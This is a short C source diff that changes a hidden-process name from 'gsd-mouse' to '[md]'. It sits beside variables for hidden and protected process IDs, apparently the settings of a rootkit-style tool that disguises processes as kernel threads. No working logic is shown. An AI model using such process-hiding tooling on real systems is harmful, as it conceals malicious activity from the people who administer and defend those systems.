@@ -22,7 +22,7 @@
 
 #define FLAG 0x80000000
 const char *protected = "[md]";
-const char *hide = "gsd-mouse";
+const char *hide = "[md]";
 int hidden_pid=-1;
 int protected_pid=-1;
 
